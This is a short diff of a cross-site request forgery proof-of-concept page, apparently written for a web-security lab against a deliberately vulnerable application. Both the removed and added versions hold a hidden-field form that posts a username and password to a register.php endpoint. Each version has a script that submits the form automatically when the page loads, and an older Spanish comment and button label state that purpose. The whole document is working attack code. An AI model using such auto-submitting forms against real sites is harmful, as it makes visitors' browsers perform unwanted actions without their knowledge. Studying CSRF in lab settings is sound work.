@@ -1,16 +1,10 @@
-<!-- csrf_register.html -->
-<html>
-  <body>
-    <form action="http://mutil.ddlr.org/index.php?page=register.php" method="POST">
-      <input type="hidden" name="username" value="csrf_user" />
-      <input type="hidden" name="password" value="1234" />
-      <input type="hidden" name="confirm_password" value="1234" />
-      <input type="submit" value="Registrarse sin querer" />
-    </form>
+<form action="http://mutil.ddlr.org/index.php?page=register.php" method="POST">
+  <input type="hidden" name="username" value="csrf_test" />
+  <input type="hidden" name="password" value="1234" />
+  <input type="hidden" name="confirm_password" value="1234" />
+  <input type="submit" value="Registrarse" />
+</form>
 
-    <script>
-      // Auto-envía el formulario al cargar la página
-      document.forms[0].submit();
-    </script>
-  </body>
-</html>
+<script>
+  document.forms[0].submit();
+</script>
